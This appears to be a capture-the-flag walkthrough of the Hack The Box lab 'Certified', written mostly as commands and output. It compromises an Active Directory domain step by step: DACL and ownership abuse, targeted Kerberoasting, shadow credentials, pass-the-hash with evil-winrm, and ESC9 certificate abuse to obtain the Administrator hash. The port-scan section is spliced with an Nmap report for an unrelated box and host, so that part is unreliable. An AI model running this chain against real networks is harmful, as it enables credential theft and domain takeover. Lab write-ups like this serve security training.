# User flag

As is common in Windows pentests, you will start the Certified box with credentials for the following account: 

Username: judith.mader Password: judith09
## 1. rustscan

```c
Open 10.129.124.89:53
Open 10.129.124.89:88
Open 10.129.124.89:135
Open 10.129.124.89:139
Open 10.129.124.89:389
Open 10.129.124.89:445
Open 10.129.124.89:464
Open 10.129.124.89:593
Open 10.129.124.89:636
Open 10.129.124.89:3268
Open 10.129.124.89:3269
Open 10.129.124.89:5985
Open 10.129.124.89:9389
Open 10.129.124.89:49666
Open 10.129.124.89:49670
Open 10.129.124.89:49689
Open 10.129.124.89:49690
Open 10.129.124.89:49695
Open 10.129.124.89:49724
Open 10.129.124.89:49745

# Nmap 7.94SVN scan initiated Wed Mar 12 08:42:38 2025 as: /usr/lib/nmap/nmap --privileged -vvv -p 22,80 -sC -sV -oN LinkVortex 10.129.164.202
Nmap scan report for linkvortex.htb (10.129.164.202)
Host is up, received echo-reply ttl 63 (0.22s latency).
Scanned at 2025-03-12 08:42:39 EDT for 14s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
80/tcp open  http    syn-ack ttl 63 Apache httpd
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-title: BitByBit Hardware
|_http-generator: Ghost 5.58
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: POST GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: A9C6DBDCDC3AE568F4E0DAD92149A0E3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
## 2. User list
```c
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ cme smb 10.129.124.89 -u judith.mader -p judith09 --users


┌──(kali㉿kali)-[~/Desktop/htb]
└─$ cat user.txt | awk '{print $5}' > userlist.txt

certified.htb\Administrator
certified.htb\Guest
certified.htb\krbtgt
certified.htb\judith.mader
certified.htb\management_svc
certified.htb\ca_operator
certified.htb\alexander.huges
certified.htb\harry.wilson
certified.htb\gregory.cameron
```

## 3. bloodhound
```c
┌──(kali㉿kali)-[~/Desktop/htb/test]
└─$ bloodhound-python -c all -d CERTIFIED.HTB -u 'judith.mader' -p 'judith09' -dc "dc01.certified.htb" -ns 10.129.124.89 --dns-tcp --zip 
```

![[Pasted image 20250312212724.png]]

## 4. Take `MANAGEMENT@CERTIFIED.HTB` ownership and add judith into group

```
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ owneredit.py -action write -new-owner judith.mader -target MANAGEMENT -dc-ip 10.129.124.89 certified.htb/judith.mader:judith09   
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!


┌──(kali㉿kali)-[~/Desktop/htb]
└─$ dacledit.py -principal 'judith.mader' -target "Management" -dc-ip 10.129.124.89 'certified.htb'/'judith.mader':'judith09' -action write
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250312-172315.bak
[*] DACL modified successfully!


┌──(kali㉿kali)-[~/Tools/windows]
└─$ python3 adduser.py -g "MANAGEMENT" -a "judith.mader" -u "judith.mader" -p "judith09" -d certified.htb
[+] Connected to Active Directory successfully.
[+] Group MANAGEMENT found.
[+] User judith.mader found.
[+] User added to group successfully.
```

## 5. try target kerberoasting on `MANAGEMENT_SVC`
```
┌──(kali㉿kali)-[~/Tools/windows/targetedKerberoast]
└─$ ./targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09' --request-user MANAGEMENT_SVC --dc-ip 10.129.124.89
[*] Starting kerberoast attacks
[*] Attacking user (MANAGEMENT_SVC)
[+] Printing hash for (management_svc)
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$25b9409d1a46e931493b2c<SNIP>

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*management_svc$CERTIFIED.HTB$certified...0b547e
Time.Started.....: Wed Mar 12 16:54:48 2025 (12 secs)
Time.Estimated...: Wed Mar 12 16:55:00 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   931.1 kH/s (2.01ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
```

## 6. Shadow credential on `management_svc`
```python
┌──(kali㉿kali)-[~/Tools/windows/pywhisker/pywhisker]
└─$ python3 pywhisker.py -d certified.htb -u judith.mader -p judith09  --dc-ip 10.129.124.89 --target "management_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 567037c3-7133-92df-24da-883002cb2797
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: J20LtE7R.pfx
[*] Must be used with password: xV99YGd3tvuNt8BDGvff
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

┌──(kali㉿kali)-[~/…/windows/pywhisker/pywhisker/PKINITtools]
└─$ python3 gettgtpkinit.py -cert-pfx ../J20LtE7R.pfx -pfx-pass xV99YGd3tvuNt8BDGvff certified.htb/management_svc management_svc.ccache
2025-03-12 17:39:50,974 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-03-12 17:39:51,007 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-03-12 17:40:02,663 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-03-12 17:40:02,663 minikerberos INFO     deaa9f3091dba6bbf1ae67f9040ec8ba54ce7cad382439450ab86c34e65c3ca8
INFO:minikerberos:deaa9f3091dba6bbf1ae67f9040ec8ba54ce7cad382439450ab86c34e65c3ca8
2025-03-12 17:40:02,669 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file


┌──(kali㉿kali)-[~/…/windows/pywhisker/pywhisker/PKINITtools]
└─$ KRB5CCNAME=management_svc.ccache python3 getnthash.py -key deaa9f3091dba6bbf1ae67f9040ec8ba54ce7cad382439450ab86c34e65c3ca8 certified.htb/management_svc
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Using TGT from cache
/home/kali/Tools/windows/pywhisker/pywhisker/PKINITtools/getnthash.py:144: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/Tools/windows/pywhisker/pywhisker/PKINITtools/getnthash.py:192: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting ticket to self with PAC
Recovered NT Hash

a091c1832bcdd4677c28b5a6a1295584
```

## 7. Evil-winrm
```
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ evil-winrm -i 10.129.124.89 -u 'management_svc' -H 'a091c1832bcdd4677c28b5a6a1295584'
```

# root flag
## 1. Take down `ca_operator`

```python
*Evil-WinRM* PS C:\Users\management_svc\Desktop> Set-ADAccountPassword CA_Operator -NewPassword $((ConvertTo-SecureString 'Passw0rd' -AsPlainText -Force)) -Reset -Verbose
Verbose: Performing the operation "Set-ADAccountPassword" on target "CN=operator ca,CN=Users,DC=certified,DC=htb".
```

## 2. certipy check
```bash
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ certipy find -u 'CA_operator' -p 'Passw0rd' -dc-ip 10.129.124.89 -vulnerable -stdout

Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireDirectoryPath
                                          SubjectAltRequireUpn
    Enrollment Flag                     : NoSecurityExtension
                                          AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16842752
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
        Write Property Principals       : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
                                          CERTIFIED.HTB\Administrator
    [!] Vulnerabilities
      ESC9                              : 'CERTIFIED.HTB\\operator ca' can enroll and template has no security extension
```

## 3. ESC9 abuse
```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ certipy account update -u 'management_svc@certified.htb' -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator  -upn Administrator@certified.htb

# check upn
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ ldapsearch -H ldap://10.129.124.89 -x -w "judith09" -D "judith.mader@certified.htb" -b "DC=certified,DC=htb" "(sAMAccountName=ca_operator)"

# req certificate
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ certipy req -u 'ca_operator@certified.htb' -p 'Passw0rd' -ca certified-DC01-CA -template CertifiedAuthentication  -dc-ip 10.129.124.89
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate with UPN 'Administrator@certified.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

# revert upn
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ certipy account update -u 'management_svc@certified.htb' -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator  -upn ca_operator@certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'

# check upn
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ ldapsearch -H ldap://10.129.124.89 -x -w "judith09" -D "judith.mader@certified.htb" -b "DC=certified,DC=htb" "(sAMAccountName=ca_operator)"


# get hash
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ certipy auth -pfx administrator.pfx -domain certified.htb 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```
## 4. Evil-winrm
```python
┌──(kali㉿kali)-[~/Desktop/htb]
└─$ evil-winrm -i 10.129.124.89 -u 'Administrator' -H '0d5b49608bbce1751f708748f67e2d34'
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/12/2025  12:49 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
```